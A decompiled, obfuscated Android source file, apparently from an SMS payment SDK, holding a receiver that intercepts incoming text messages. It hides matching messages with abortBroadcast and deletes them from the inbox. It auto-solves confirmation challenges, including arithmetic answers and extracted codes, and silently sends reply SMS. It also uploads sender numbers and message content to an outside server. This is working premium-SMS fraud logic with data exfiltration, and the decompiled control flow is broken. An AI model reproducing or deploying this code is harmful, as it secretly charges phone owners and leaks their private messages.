package com.hzpz.pay.service;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import com.hzpz.pay.PzPay;
import com.hzpz.pay.PzPay.1.1;
import com.hzpz.pay.U;
import com.hzpz.pay.V;
import com.hzpz.pay.a;
import com.hzpz.pay.aF;
import com.hzpz.pay.aJ;
import com.hzpz.pay.aK;
import com.hzpz.pay.aL;
import com.hzpz.pay.aP;
import com.hzpz.pay.ai;
import com.hzpz.pay.at;
import com.hzpz.pay.az.a;
import java.io.PrintStream;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsPushReceiver
  extends BroadcastReceiver
{
  private static List a = new ArrayList();
  
  public SmsPushReceiver() {}
  
  private static void a(ContentResolver paramContentResolver, String paramString1, SmsPushReceiver paramSmsPushReceiver, Context paramContext, String paramString2, String paramString3)
  {
    if (paramSmsPushReceiver != null)
    {
      paramSmsPushReceiver.abortBroadcast();
      aP.a("TAG", "broadSms：" + paramString2 + " " + paramString3);
    }
    for (;;)
    {
      if (a.size() > 0)
      {
        paramContentResolver = a.iterator();
        label60:
        if (paramContentResolver.hasNext()) {}
      }
      else
      {
        if (a.size() != 5) {
          break label347;
        }
        a.remove(0);
        a.add(new String[] { paramString2, paramString3 });
        paramContentResolver = new ai();
        paramString1 = new HashMap();
        if (PzPay.u != null) {
          paramString1.put("CType", PzPay.u.ordinal());
        }
        paramString1.put("SpNum", paramString2);
        paramString1.put("FeedbackType", "2");
      }
      try
      {
        if (!PzPay.1.1.d(paramString3)) {
          paramString1.put("Content", URLEncoder.encode(paramString3, "UTF-8"));
        }
        paramContentResolver.a("http://if.unidian.com/APP/AppSMSPayLog.aspx", paramString1, az.a.a, PzPay.1.1.b(paramContext));
        aP.c("TAG", "AppSMSPayLogRequest：SpNum-" + paramString2 + ",sms-" + paramString3);
        return;
        if (paramContentResolver == null) {
          continue;
        }
        int i = paramContentResolver.delete(PzPay.x, "_id=?", new String[] { paramString1 });
        aP.a("TAG", "change_URL_CONTENT：" + paramString1 + " " + i);
        continue;
        paramString1 = (String[])paramContentResolver.next();
        if ((!paramString2.equalsIgnoreCase(paramString1[0])) || (!paramString3.equalsIgnoreCase(paramString1[1]))) {
          break label60;
        }
        return;
        label347:
        a.add(new String[] { paramString2, paramString3 });
      }
      catch (UnsupportedEncodingException paramSmsPushReceiver)
      {
        for (;;)
        {
          paramString1.put("Content", "");
          paramSmsPushReceiver.printStackTrace();
        }
      }
    }
  }
  
  public static void a(Context paramContext, ContentResolver paramContentResolver)
  {
    localCursor = null;
    try
    {
      localObject2 = PzPay.c();
      localObject1 = localObject2;
      if (localObject2 == null) {
        localObject1 = at.a(paramContext);
      }
      if (localObject1 != null) {
        aP.a("TAG", "短信数量" + ((V)localObject1).e.size() + " " + ((V)localObject1).f.size());
      }
    }
    catch (Exception paramContext)
    {
      for (;;)
      {
        try
        {
          localCursor = paramContentResolver.query(PzPay.x, new String[] { "_id", "address", "body", "type", "read" }, null, null, "date desc");
          if (localCursor != null) {
            localObject1 = localCursor;
          }
        }
        catch (Exception paramContentResolver)
        {
          Object localObject2;
          Object localObject1;
          paramContext = null;
        }
        finally
        {
          try
          {
            paramContentResolver.printStackTrace();
            if ((paramContext == null) || (paramContext.isClosed())) {
              continue;
            }
            paramContext.close();
            return;
          }
          finally
          {
            localContext = paramContext;
            paramContext = paramContentResolver;
          }
          paramContext = finally;
          if ((localException != null) && (!localException.isClosed())) {
            localException.close();
          }
        }
        try
        {
          if (localCursor.moveToNext())
          {
            localObject1 = localCursor;
            localObject2 = localCursor.getString(localCursor.getColumnIndex("address"));
            localObject1 = localCursor;
            String str1 = localCursor.getString(localCursor.getColumnIndex("body"));
            localObject1 = localCursor;
            String str2 = localCursor.getString(localCursor.getColumnIndex("_id"));
            localObject1 = localCursor;
            String str3 = localCursor.getString(localCursor.getColumnIndex("read"));
            localObject1 = localCursor;
            String str4 = localCursor.getString(localCursor.getColumnIndex("type"));
            localObject1 = localCursor;
            aP.a("TAG", "_id:" + str2 + " sender:" + (String)localObject2 + " body:" + str1 + " type:" + str4 + " read:" + str3);
            localObject1 = localCursor;
            if ("1".equals(str4))
            {
              localObject1 = localCursor;
              if ("0".equals(str3))
              {
                localObject1 = localCursor;
                aP.c("TAG", "########_id:" + str2 + " sender:" + (String)localObject2 + " body:" + str1 + " type:" + str4 + " read:" + str3);
                localObject1 = localCursor;
                a(paramContext, paramContentResolver, str2, null, (String)localObject2, str1);
              }
            }
          }
          if ((localCursor != null) && (!localCursor.isClosed())) {
            localCursor.close();
          }
          return;
        }
        catch (Exception paramContentResolver)
        {
          Context localContext;
          paramContext = localCursor;
          continue;
        }
        localException = localException;
        localException.printStackTrace();
      }
    }
    localObject1 = localCursor;
  }
  
  private static void a(Context paramContext, ContentResolver paramContentResolver, String paramString1, SmsPushReceiver paramSmsPushReceiver, String paramString2, String paramString3)
  {
    aP.a("TAG", "--abortBroadcast-msg--" + paramString2 + ":" + paramString3);
    Object localObject2 = PzPay.c();
    Object localObject1 = localObject2;
    if (localObject2 == null) {
      localObject1 = at.a(paramContext);
    }
    if (localObject1 != null)
    {
      localObject2 = new ArrayList();
      if ((((V)localObject1).f != null) && (((V)localObject1).f.size() > 0)) {
        ((List)localObject2).addAll(((V)localObject1).f);
      }
      ((List)localObject2).addAll(((V)localObject1).e);
      localObject1 = ((List)localObject2).iterator();
      bool1 = false;
    }
    boolean bool2;
    label140:
    int i;
    label281:
    label295:
    do
    {
      do
      {
        do
        {
          do
          {
            if (!((Iterator)localObject1).hasNext())
            {
              bool2 = bool1;
              if (bool2) {
                a(paramContentResolver, paramString1, paramSmsPushReceiver, paramContext, paramString2, paramString3);
              }
              return;
            }
            localObject2 = (U)((Iterator)localObject1).next();
            bool2 = bool1;
            if ("1".equals(((U)localObject2).h))
            {
              boolean bool3 = bool1;
              if (!PzPay.1.1.d(((U)localObject2).c))
              {
                bool3 = bool1;
                if (paramString2.indexOf(((U)localObject2).c) != -1)
                {
                  a("Find：" + paramString2 + " " + paramString3);
                  bool3 = true;
                }
              }
              bool2 = bool3;
              if (((U)localObject2).i != null)
              {
                bool2 = bool3;
                if (((U)localObject2).i.length > 0)
                {
                  i = 0;
                  if (i < ((U)localObject2).i.length) {
                    break;
                  }
                  i = 0;
                  bool2 = bool3;
                  if (i != 0)
                  {
                    a("Find：" + paramString2 + " " + paramString3);
                    bool2 = true;
                  }
                }
              }
            }
            bool1 = bool2;
          } while ("0".equals(((U)localObject2).k));
          bool1 = bool2;
        } while (PzPay.1.1.d(((U)localObject2).l));
        bool1 = bool2;
      } while (paramString2.indexOf(((U)localObject2).l) == -1);
      bool1 = bool2;
    } while (paramString2.length() <= ((U)localObject2).l.length());
    if ("1".equals(((U)localObject2).h)) {
      a("Find：" + paramString2 + " " + paramString3);
    }
    for (boolean bool1 = true;; bool1 = bool2)
    {
      int j;
      if ("1".equals(((U)localObject2).k))
      {
        aP.a("TAG", "发送1。1。。" + paramString2 + "###" + ((U)localObject2).m);
        if (!PzPay.1.1.d(((U)localObject2).t))
        {
          localObject1 = ((U)localObject2).t.split("\\|");
          j = localObject1.length;
          i = 0;
        }
        for (;;)
        {
          if (i >= j) {}
          for (;;)
          {
            aP.a("TAG", "XXXXXXXXX");
            bool2 = bool1;
            break;
            if (paramString2.indexOf(localObject2.i[i].trim()) != -1)
            {
              i = 1;
              break label295;
            }
            i += 1;
            break label281;
            if (!paramString3.contains(localObject1[i])) {
              break label627;
            }
            a(paramContext, paramString2, ((U)localObject2).m, paramString3, (U)localObject2, bool1);
          }
          label627:
          i += 1;
        }
      }
      Object localObject3;
      if ("2".equals(((U)localObject2).k))
      {
        if ((PzPay.1.1.d(((U)localObject2).m)) || (PzPay.1.1.d(paramString3))) {
          break label1845;
        }
        localObject3 = ((U)localObject2).m.split("\\|");
        aP.a("TAG", "动态:" + ((U)localObject2).m);
        if (localObject3.length == 2)
        {
          localObject3 = Pattern.compile("(?<=" + localObject3[0] + ").*(?=" + localObject3[1] + ")").matcher(paramString3);
          localObject1 = null;
          if (((Matcher)localObject3).find()) {
            localObject1 = ((Matcher)localObject3).group();
          }
          bool2 = bool1;
          if (localObject1 == null) {
            break label140;
          }
          localObject1 = Pattern.compile("[a-zA-Z0-9]+").matcher((CharSequence)localObject1);
          bool2 = bool1;
          if (!((Matcher)localObject1).find()) {
            break label140;
          }
          localObject1 = ((Matcher)localObject1).group();
          aP.a("TAG", "发送1。2。。" + paramString2 + "###" + (String)localObject1 + "###动态指令：" + ((U)localObject2).m);
          a(paramContext, paramString2, (String)localObject1, paramString3, (U)localObject2, bool1);
          bool2 = bool1;
          break label140;
        }
        if (localObject3.length != 1) {
          break label1845;
        }
        localObject3 = localObject3[0];
        i = paramString3.indexOf((String)localObject3);
        if (i == -1) {
          break label1845;
        }
        a(paramContext, paramString2, paramString3.substring(((String)localObject3).length() + i, paramString3.length()), paramString3, (U)localObject2, bool1);
        bool2 = bool1;
        break label140;
      }
      Object localObject4;
      if ("3".equals(((U)localObject2).k))
      {
        if ((PzPay.1.1.d(((U)localObject2).m)) || (PzPay.1.1.d(paramString3))) {
          break label1845;
        }
        aP.a("TAG", "--答题 --" + ((U)localObject2).m);
        localObject1 = Pattern.compile(((U)localObject2).m).matcher(paramString3);
        label1240:
        do
        {
          bool2 = bool1;
          try
          {
            if (!((Matcher)localObject1).find()) {
              break;
            }
            localObject3 = ((Matcher)localObject1).group();
            localObject4 = ((String)localObject3).split("[+-/*=]");
            i = Integer.parseInt(localObject4[0]);
            j = Integer.parseInt(localObject4[1]);
            localObject4 = ((String)localObject3).substring(((String)localObject3).indexOf(localObject4[0]) + localObject4[0].length(), ((String)localObject3).lastIndexOf(localObject4[1]));
            System.out.println(localObject3 + "###" + (String)localObject4);
            if (!"*".equals(localObject4)) {
              break label1240;
            }
            i *= j;
            aP.a("TAG", "发送1。2。。" + paramString2 + "###" + i);
            a(paramContext, paramString2, String.valueOf(i), paramString3, (U)localObject2, bool1);
            bool2 = bool1;
          }
          catch (Exception localException)
          {
            localException.printStackTrace();
            aP.a("TAG", "计算出错");
            bool2 = bool1;
          }
          break;
          if ("/".equals(localObject4))
          {
            i /= j;
            aP.a("TAG", "发送1。2。。" + paramString2 + "###" + i);
            a(paramContext, paramString2, String.valueOf(i), paramString3, (U)localObject2, bool1);
            bool2 = bool1;
            break;
          }
          if ("+".equals(localObject4))
          {
            i += j;
            aP.a("TAG", "发送1。2。。" + paramString2 + "###" + i);
            a(paramContext, paramString2, String.valueOf(i), paramString3, (U)localObject2, bool1);
            bool2 = bool1;
            break;
          }
        } while (!"-".equals(localObject4));
        i -= j;
        aP.a("TAG", "发送1。2。。" + paramString2 + "###" + i);
        a(paramContext, paramString2, String.valueOf(i), paramString3, (U)localObject2, bool1);
        bool2 = bool1;
        break label140;
      }
      if (("4".equals(((U)localObject2).k)) && (!PzPay.1.1.d(((U)localObject2).m)) && (!PzPay.1.1.d(paramString3)))
      {
        aP.a("TAG", "--前N位 --" + ((U)localObject2).m);
        localObject3 = paramString3.substring(0, Integer.parseInt(((U)localObject2).m));
        if ("12".equals(((U)localObject2).o))
        {
          bool2 = bool1;
          if (a(paramString2, paramString3, bool1)) {
            break label140;
          }
          a(paramContext, (U)localObject2, (String)localObject3);
          bool2 = bool1;
          break label140;
        }
        String[] arrayOfString;
        if (("13".equals(((U)localObject2).o)) && (!PzPay.1.1.d(((U)localObject2).p)))
        {
          arrayOfString = ((U)localObject2).p.split(",");
          bool2 = bool1;
          if (arrayOfString.length < 3) {
            break label140;
          }
          bool2 = bool1;
          if (a(paramString2, paramString3, bool1)) {
            break label140;
          }
          a(paramContext, (U)localObject2, arrayOfString[1], (String)localObject3);
          bool2 = bool1;
          break label140;
        }
        localObject4 = ((U)localObject2).d.split(",");
        if (localObject4.length >= 3)
        {
          localObject3 = aL.a(localObject4[0], ((U)localObject2).w, "1012", (String)localObject3, PzPay.r);
          if (!PzPay.1.1.d(((U)localObject2).t))
          {
            arrayOfString = ((U)localObject2).t.split("\\|");
            j = arrayOfString.length;
            i = 0;
            for (;;)
            {
              bool2 = bool1;
              if (i >= j) {
                break;
              }
              if (paramString3.contains(arrayOfString[i]))
              {
                if ("13".equals(((U)localObject2).o))
                {
                  ((U)localObject2).n = "";
                  a(paramContext, ((U)localObject2).c, (String)localObject3, paramString3, (U)localObject2, bool1);
                  bool2 = bool1;
                  break;
                }
                a(paramContext, paramString2, (String)localObject3, paramString3, (U)localObject2, bool1);
                bool2 = bool1;
                break;
              }
              i += 1;
            }
          }
        }
      }
      label1845:
      break;
    }
  }
  
  private static void a(Context paramContext, U paramU, String paramString)
  {
    new Thread(new aJ(paramU, paramString, paramContext)).start();
  }
  
  private static void a(Context paramContext, U paramU, String paramString1, String paramString2)
  {
    new Thread(new aK(paramContext, paramString1, paramU, paramString2)).start();
  }
  
  private static void a(Context paramContext, SmsPushReceiver paramSmsPushReceiver, String paramString1, String paramString2)
  {
    a(paramContext, null, null, paramSmsPushReceiver, paramString1, paramString2);
  }
  
  private static void a(Context paramContext, String paramString1, String paramString2, String paramString3, U paramU, boolean paramBoolean)
  {
    if (a(paramString1, paramString3, paramBoolean)) {
      return;
    }
    if (!TextUtils.isEmpty(paramU.n)) {}
    for (paramContext = paramU.n;; paramContext = paramString1)
    {
      paramString1 = SmsManager.getDefault();
      try
      {
        paramString1.sendTextMessage(paramContext, null, paramString2, null, null);
        if ((paramU != null) && ("1".equals(paramU.s))) {
          new aF().a(paramU.v, paramU.o, paramU.b, paramU.a, "1", "0", "[" + paramContext + "][" + paramString3 + "][" + paramString2 + "]");
        }
        paramContext = new StringBuilder("cn:").append(paramContext).append("###").append(paramString2).append("###");
        if ((paramU != null) && ("1".equals(paramU.s)))
        {
          paramBoolean = true;
          aP.a("TAG", paramBoolean);
          return;
        }
      }
      catch (IllegalArgumentException paramString1)
      {
        for (;;)
        {
          aP.c("TAG", "发送短信出错");
          continue;
          paramBoolean = false;
        }
      }
    }
  }
  
  private static void a(String paramString)
  {
    aP.c("TAG", paramString);
  }
  
  private static boolean a(String paramString1, String paramString2, boolean paramBoolean)
  {
    Iterator localIterator;
    if (a.size() > 0)
    {
      localIterator = a.iterator();
      if (localIterator.hasNext()) {}
    }
    else if (!paramBoolean)
    {
      if (a.size() < 5) {
        break label113;
      }
      a.remove(0);
      a.add(new String[] { paramString1, paramString2 });
    }
    for (;;)
    {
      return false;
      String[] arrayOfString = (String[])localIterator.next();
      if ((!paramString1.equalsIgnoreCase(arrayOfString[0])) || (!paramString2.equalsIgnoreCase(arrayOfString[1]))) {
        break;
      }
      return true;
      label113:
      a.add(new String[] { paramString1, paramString2 });
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    int j = 0;
    aP.a("TAG", "onReceive..............");
    if ("android.provider.Telephony.SMS_RECEIVED".equals(paramIntent.getAction()))
    {
      paramIntent = paramIntent.getExtras();
      SmsMessage[] arrayOfSmsMessage;
      int i;
      StringBuffer localStringBuffer;
      int k;
      if (paramIntent != null)
      {
        paramIntent = (Object[])paramIntent.get("pdus");
        arrayOfSmsMessage = new SmsMessage[paramIntent.length];
        i = 0;
        if (i < paramIntent.length) {
          break label96;
        }
        localStringBuffer = new StringBuffer();
        k = arrayOfSmsMessage.length;
        paramIntent = null;
        i = j;
      }
      for (;;)
      {
        if (i >= k)
        {
          a(paramContext, this, paramIntent, localStringBuffer.toString());
          return;
          label96:
          arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])paramIntent[i]);
          i += 1;
          break;
        }
        SmsMessage localSmsMessage = arrayOfSmsMessage[i];
        paramIntent = localSmsMessage.getDisplayOriginatingAddress();
        localStringBuffer.append(localSmsMessage.getDisplayMessageBody());
        i += 1;
      }
    }
    "android.provider.Telephony.WAP_PUSH_RECEIVED".equals(paramIntent.getAction());
  }
}
